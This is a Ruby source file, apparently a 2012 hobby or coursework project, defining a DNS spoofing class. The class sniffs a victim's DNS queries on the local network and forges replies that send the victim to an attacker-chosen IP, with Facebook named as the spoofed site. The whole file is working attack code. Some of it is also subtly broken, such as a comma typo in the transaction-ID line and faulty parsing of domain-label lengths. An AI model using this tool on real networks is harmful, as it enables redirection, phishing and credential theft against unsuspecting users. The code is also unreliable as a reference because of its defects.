#!/usr/bin/env ruby

#-------------------------------------------------------------------------------
# dns.rb
#
# DNS Spoofing Class
#
# Author: Karl Castillo
#
# Date: October 26, 2012
#
# Functions:
# initialize - initialize the class
# start - start spoofing
#
# Revisions: (Date and Description)
#
# Notes:
#
#-------------------------------------------------------------------------------
require 'rubygems'
require 'packetfu'
require File.dirname(__FILE__) + '/spoof.rb'

class DNSSpoof < Spoof

    #---------------------------------------------------------------------------
    # initialize
    #
    # Initialization of the DNSSpoofer Class
    #
    # spoof_ip - the IP address where the victim will be sent to
    # victim_ip - Victim's IP
    # iface - NIC Device (default = "em1")
    # spoof - true to start spoofing, false to not start (default = false)
    #
    # Revision: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------    
    def initialize(spoof_ip, victim_ip, iface = "em1", spoof = false)
        @spoof_ip = spoof_ip
        @victim_ip = victim_ip
        @victim_mac = PacketFu::Utils.arp(victim_ip, :iface => iface)
        @interface = iface
        
        if spoof then
            start
        end
    end # initalize
    
    #def send(packet)
    #    packet.to_w(@interface)
    #end # send(packet)
    
    #---------------------------------------------------------------------------
    # start
    #
    # Start DNS spoofing
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def start
        # Check if already spoofing
        if @running then
            puts "Spoofer is already running."
            return
        end
        
        @running = true
        
        # Only capture DNS packets
        filter = "udp and port 53"
                
        cap = PacketFu::Capture.new(:iface => @interface, :start => true,
                        :promisc => true, :filter => filter, :save => true)
                        
        puts "DNS Packet sniffing starting..."
        
        # Start packet sniffing
        cap.stream.each do |pkt|
            @packet = PacketFu::Packet.parse(pkt)
            
            dnsquery = @packet.payload[2].unpack('h*')[0].chr + \
                       @packet.payload[3].unpack('h*')[0].chr
            
            # Check if Query
            if dnsquery == '10' then
                @domain_name = get_domain(@packet.payload[12..-1])
                
                # Check if domain name field is empty
                if @domain_name.nil? then
                    puts "Empty domain name field"
                    next
                end # @domain_name.nil?
                
                puts "Domain name: #{@domain_name}"
                send_response
                
            end # dnsquery == '10' then
        end # cap stream.each do |pkt|
    end # start
    
    #---------------------------------------------------------------------------
    # get_domain
    #
    # Parse the DNS header and turn the domain name to a string
    #
    # payload - the payload of the DNS header
    #
    # returns domain name as a string
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    #---------------------------------------------------------------------------
    def get_domain(payload)
        domain_name = ""
        while(true)
            # Get length fields
            len = payload[0].unpack('H*')[0].to_i
            
            if len != 0 then
                domain_name += payload[1, len] + "."
                payload = payload[len + 1..-1]
            else
                domain_name = domain_name[0, domain_name.length - 1]
                return domain_name
            end # if len != 0 then
        end # while(true)
    end # get_domain(payload)
    
    #---------------------------------------------------------------------------
    # send_response
    #
    # Create a DNS response packet and send it back to the victim
    #
    # Revisions: (Date and Description)
    #
    # Notes:
    # Current websites being spoofed:
    #   ~ www.facebook.com
    #
    # To be implemented:
    #   ~ www.twitter.com
    #   ~ www.google.ca
    #---------------------------------------------------------------------------
    def send_response
        cfg = PacketFu::Utils.whoami?(:iface => @interface)
        transID1 = @packet[0].unpack('H*')[0]
        transID2 = @packet[1].unpack('H*')[0]

        # Create response packet
        udp_packet = PacketFu::UDPPacket.new(:config => cfg, 
                                :udp_src => @packet.udp_dst, 
                                :udp_dst => @packet.udp_src)
        udp_packet.eth_daddr = @victim_mac
        udp_packet.ip_daddr = @victim_ip
        udp_packet.ip_saddr = @packet.ip_saddr
        udp_packet.payload = transID1,hex.chr + transID2.hex.chr
        
        udp_packet.payload += "\x81" + "\x80" + "\x00" + "\x01" + "\x00" + "\x01"
        udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x00"
        
        @domain_name.split('.').each do |part|
            udp_packet.payload += part.length.chr
            udp_packet.payload += part
        end # @domain_name.split('.').each do |part|
       
        udp_packet.payload += "\x00" + "\x00" + "\x01" + "\x00" + "\x01"
        udp_packet.payload += "\xc0" + "\x0c"
        udp_packet.payload += "\x00" + "\x01" + "\x00" + "\x01"
        # ttl
        udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x83"
        # data length
        udp_packet.payload += "\x00" + "\x04"
        
        # Address
        spoof_ip = @spoof_ip.split('.')
        udp_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*')
        
        udp_packet.recalc
        
        #puts "Sending spoof"
        send(udp_packet)     
    end # send_response
end
